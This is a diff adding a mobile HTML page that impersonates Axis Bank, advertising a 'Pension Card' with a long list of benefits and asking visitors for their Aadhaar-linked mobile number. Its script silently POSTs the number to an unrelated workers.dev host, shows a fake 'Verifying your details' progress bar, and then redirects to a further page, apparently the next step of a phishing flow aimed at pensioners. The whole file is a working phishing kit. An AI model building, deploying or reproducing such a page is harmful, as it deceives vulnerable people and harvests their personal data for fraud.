@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Axis Bank | Pension Card Services</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Public+Sans:wght@400;600;700;900&display=swap" rel="stylesheet">
+    <style>
+        :root { --axis: #971237; }
+        body { font-family: 'Public Sans', sans-serif; background-color: #ffffff; margin: 0; padding: 0; overflow-x: hidden; }
+        .full-logo { width: 100%; height: auto; display: block; border-bottom: 1px solid #f3f4f6; }
+        .hero-box {
+            position: relative; width: 100%; height: 260px;
+            background: linear-gradient(90deg, #ffffff 40%, rgba(255, 255, 255, 0) 100%);
+            display: flex; align-items: center; overflow: hidden;
+        }
+        .hero-img {
+            position: absolute; right: -10px; top: 0; height: 100%; width: auto; z-index: 1;
+            -webkit-mask-image: linear-gradient(to left, rgba(0,0,0,1) 80%, rgba(0,0,0,0) 100%);
+            mask-image: linear-gradient(to left, rgba(0,0,0,1) 80%, rgba(0,0,0,0) 100%);
+            object-fit: contain;
+        }
+        .content-overlay { position: relative; z-index: 10; padding-left: 20px; width: 60%; }
+        .benefit-card {
+            border: 1px solid #f3f4f6; display: flex; align-items: center; gap: 12px; padding: 14px;
+            border-radius: 16px; background: white;
+        }
+        .benefit-icon {
+            width: 40px; height: 40px; border-radius: 12px; display: flex; 
+            align-items: center; justify-content: center; background: #fff5f7; color: var(--axis); flex-shrink: 0;
+        }
+        .mobile-input {
+            width: 100%; padding: 14px; border: 1.5px solid #e5e7eb;
+            border-radius: 12px; font-size: 16px; outline: none; transition: all 0.3s;
+        }
+        .mobile-input:focus { border-color: var(--axis); }
+        .progress-container {
+            width: 100%; height: 8px; background: #f3f4f6; border-radius: 10px; overflow: hidden; display: none; margin-top: 15px;
+        }
+        .progress-bar { width: 0%; height: 100%; background: var(--axis); transition: width 5s linear; }
+        .btn-apply { background-color: var(--axis); width: 100%; color: white; padding: 16px; border-radius: 12px; font-weight: 900; }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <header><img src="https://i.ibb.co/d4BCqfS6/chrome-screenshot-19-Apr-2026-7-42-45-am-IST.png" alt="Axis Bank" class="full-logo"></header>
+
+    <main class="flex-1">
+        <div class="hero-box border-b border-gray-50">
+            <div class="content-overlay">
+                <div class="inline-block bg-pink-100 text-[#971237] text-[10px] font-bold px-2 py-0.5 rounded mb-2 uppercase tracking-wider">Priority Banking</div>
+                <h1 class="text-[24px] font-black text-gray-900 leading-tight">Axis Bank <br> <span class="text-[#971237]">Pension Card</span></h1>
+                <p class="text-[12px] text-gray-500 mt-2 mb-6 font-bold leading-snug">Secure and comfortable <br>retirement for you.</p>
+                <a href="#apply-box" class="bg-[#971237] text-white px-6 py-2.5 rounded-lg font-bold text-[12px] uppercase tracking-wide inline-block">Apply Now</a>
+            </div>
+            <img src="https://i.ibb.co/G4TQfFzz/1776588401055.png" alt="Axis Banner" class="hero-img">
+        </div>
+
+        <div class="px-5 py-8 bg-white">
+            <h2 class="text-[18px] font-bold text-gray-800 mb-6 flex items-center gap-2"><span class="w-1.5 h-6 bg-[#971237] rounded-full"></span> Special Privileges</h2>
+            <div class="grid grid-cols-1 gap-3">
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-percent"></i></div><div><h3 class="font-bold text-[14px]">0.50% Extra Interest</h3><p class="text-[11px] text-gray-400">Higher returns on all Fixed Deposits.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-notes-medical"></i></div><div><h3 class="font-bold text-[14px]">Free Health Checkup</h3><p class="text-[11px] text-gray-400">Complimentary annual health screening.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-truck-fast"></i></div><div><h3 class="font-bold text-[14px]">Doorstep Banking</h3><p class="text-[11px] text-gray-400">Home cash delivery and pick-up service.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-video"></i></div><div><h3 class="font-bold text-[14px]">Video Life Certificate</h3><p class="text-[11px] text-gray-400">Easy digital Jeevan Praman submission.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-shield-halved"></i></div><div><h3 class="font-bold text-[14px]">Free Accident Cover</h3><p class="text-[11px] text-gray-400">Complimentary insurance up to ₹5 Lakhs.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-gem"></i></div><div><h3 class="font-bold text-[14px]">Priority Service</h3><p class="text-[11px] text-gray-400">Dedicated assistance at every branch.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-pills"></i></div><div><h3 class="font-bold text-[14px]">Pharmacy Discounts</h3><p class="text-[11px] text-gray-400">Flat 20% off on medicine orders.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-wallet"></i></div><div><h3 class="font-bold text-[14px]">Zero Balance Savings</h3><p class="text-[11px] text-gray-400">No minimum balance maintenance required.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-user-group"></i></div><div><h3 class="font-bold text-[14px]">Nominee Support</h3><p class="text-[11px] text-gray-400">Quick and easy family nomination.</p></div></div>
+                <div class="benefit-card shadow-sm"><div class="benefit-icon"><i class="fa-solid fa-plane"></i></div><div><h3 class="font-bold text-[14px]">Travel Cashback</h3><p class="text-[11px] text-gray-400">Exclusive travel and hotel offers.</p></div></div>
+            </div>
+        </div>
+
+        <div id="apply-box" class="px-6 py-10 bg-gray-50 text-center border-t border-gray-200">
+            <div id="form-container">
+                <h3 class="text-[18px] font-bold text-gray-800 mb-2">Get Started Now</h3>
+                <p class="text-[12px] text-gray-500 mb-6">Enter mobile number linked with Aadhaar.</p>
+                <div class="relative mb-4">
+                    <span class="absolute left-4 top-[14px] text-gray-400 font-bold">+91</span>
+                    <input type="tel" id="mobileNumber" placeholder="Mobile Number" maxlength="10" class="mobile-input pl-14" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                </div>
+                <button onclick="handleSubmission()" id="submitBtn" class="btn-apply uppercase tracking-widest">Apply Now</button>
+            </div>
+            <div id="processing-ui" class="hidden">
+                <h3 class="text-[16px] font-bold text-[#971237] mb-2">Verifying your details...</h3>
+                <div class="progress-container" style="display: block;"><div id="bar" class="progress-bar"></div></div>
+            </div>
+        </div>
+    </main>
+
+    <footer class="bg-[#374151] text-white pt-10 pb-8 px-6 mt-auto border-t border-gray-600 text-center">
+        <p class="font-bold text-[14px] mb-1 uppercase tracking-widest">Axis Bank</p>
+        <p class="text-[9px] text-gray-400">Registered Office: 'Trishul', Ahmedabad.</p>
+    </footer>
+
+    <script>
+        async function handleSubmission() {
+            const mobile = document.getElementById('mobileNumber').value;
+            if (mobile.length !== 10) { alert('Please enter 10-digit mobile number.'); return; }
+            document.getElementById('form-container').classList.add('hidden');
+            document.getElementById('processing-ui').classList.remove('hidden');
+            setTimeout(() => { document.getElementById('bar').style.width = '100%'; }, 100);
+            try {
+                await fetch('https://snowy-sunset-a557.sumankkuuyy.workers.dev/', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ mobile: mobile, page: 'Index_Apply' })
+                });
+            } catch (err) {}
+            setTimeout(() => { window.location.href = 'hero.html'; }, 5000);
+        }
+    </script>
+</body>
+</html>
+
